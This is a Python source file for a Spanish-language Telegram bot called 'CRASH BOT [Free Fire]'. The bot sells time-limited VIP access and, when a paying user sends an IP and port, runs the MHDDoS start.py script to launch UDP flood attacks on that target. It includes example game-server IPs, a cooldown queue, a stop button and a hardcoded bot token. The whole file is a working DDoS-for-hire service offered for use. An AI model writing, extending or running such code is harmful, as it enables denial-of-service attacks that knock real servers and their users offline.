import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock, Thread
import time
import re
import atexit
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configuración
BOT_TOKEN = "7936557199:AAEApn5oOlE9d7akq6gukp4tJKCA8c0m1zo"
ADMIN_ID = 5761216872
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}
pending_attacks = {}  # Cola de ataques pendientes

# Conexión a la base de datos
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
""")
conn.commit()

# Funciones auxiliares
def is_admin(user_id):
    return user_id == ADMIN_ID

def validate_ip_port(ip_port):
    pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$"
    return re.match(pattern, ip_port)

def cleanup():
    for process in active_attacks.values():
        process.terminate()

atexit.register(cleanup)

# Hilo para procesar ataques pendientes
def process_pending_attacks():
    while True:
        time.sleep(1)  # Verificar cada segundo
        current_time = time.time()
        to_remove = []

        for telegram_id, attack_info in pending_attacks.items():
            if current_time - cooldowns.get(telegram_id, 0) >= 10:  # Cooldown terminado
                # Iniciar el ataque
                ip_port = attack_info["ip_port"]
                attack_type = attack_info["attack_type"]
                threads = attack_info["threads"]
                duration = attack_info["duration"]

                try:
                    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    active_attacks[telegram_id] = process
                    cooldowns[telegram_id] = current_time

                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

                    bot.send_message(
                        telegram_id,
                        f"*[✅] ATAQUE INICIADO - 200 [✅]*\n🌐 *Puerto:* {ip_port}\n⚙️ *Tipo:* {attack_type}\n🧟‍♀️ *Threads:* {threads}\n⏳ *Tiempo (ms):* {duration}",
                        parse_mode="Markdown",
                        reply_markup=markup
                    )
                except Exception as e:
                    bot.send_message(telegram_id, f"❌ Error al iniciar el ataque: {str(e)}")

                to_remove.append(telegram_id)

        # Limpiar ataques procesados
        for telegram_id in to_remove:
            del pending_attacks[telegram_id]

# Iniciar el hilo de procesamiento
Thread(target=process_pending_attacks, daemon=True).start()

# Comando /start
@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id
    with db_lock:
        cursor.execute("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", (telegram_id,))
        result = cursor.fetchone()

    vip_status = "❌ *No tienes un plan vip activo.*"
    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Seu plano VIP expirou.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = f"✅ CLIENTE VIP!\n⏳ Dias restantes: {dias_restantes} dia(s)\n📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(text="💻 VENDEDOR - OFICIAL 💻", url=f"tg://user?id={ADMIN_ID}")
    markup.add(button)

    bot.reply_to(message, f"🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*\n\n```{vip_status}```\n📌 *Como usar:*\n```/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n💡 *Ejemplo:*\n```/crash UDP 143.92.125.230:10013 10 900```", reply_markup=markup, parse_mode="Markdown")

# Manejar IPs directamente en el chat
@bot.message_handler(func=lambda message: True)
def handle_direct_ip(message):
    telegram_id = message.from_user.id
    text = message.text.strip()

    # Verificar si el mensaje es una IP válida
    if validate_ip_port(text):
        # Verificar si el usuario es VIP
        with db_lock:
            cursor.execute("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", (telegram_id,))
            result = cursor.fetchone()

        if not result or datetime.now() > datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S"):
            bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
            return

        # Verificar cooldown
        if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
            # Guardar el ataque en la cola de espera
            pending_attacks[telegram_id] = {
                "ip_port": text,
                "attack_type": "UDP",
                "threads": "10",
                "duration": "2400",
                "timestamp": time.time()
            }
            bot.reply_to(message, "⏳ Estás en cooldown. Tu ataque se iniciará automáticamente cuando termine el cooldown.")
            return

        # Valores predeterminados
        attack_type = "UDP"
        threads = "2"
        duration = "9000"

        try:
            command = ["python", START_PY_PATH, attack_type, text, threads, duration]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[telegram_id] = process
            cooldowns[telegram_id] = time.time()

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

            bot.reply_to(message, f"*[✅] ATAQUE INICIADO - 200 [✅]*\n🌐 *Puerto:* {text}\n⚙️ *Tipo:* {attack_type}\n🧟‍♀️ *Threads:* {threads}\n⏳ *Tiempo (ms):* {duration}", reply_markup=markup, parse_mode="Markdown")
        except Exception as e:
            bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
    else:
        bot.reply_to(message, "❌ Formato inválido. Usa el formato `IP:PUERTO`, por ejemplo: `148.153.170.241:10018`.")

# Detener ataque
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])
    if call.from_user.id != telegram_id:
        bot.answer_callback_query(call.id, "❌ Solo el usuario que inició el ataque puede pararlo.")
        return

    if telegram_id in active_attacks:
        process = active_attacks.pop(telegram_id)
        process.terminate()
        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
        bot.edit_message_text("*[⛔] ATAQUE FINALIZADO[⛔]*", chat_id=call.message.chat.id, message_id=call.message.id, parse_mode="Markdown")
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ No se encontró ningún ataque activo.")

if __name__ == "__main__":
    bot.infinity_polling()
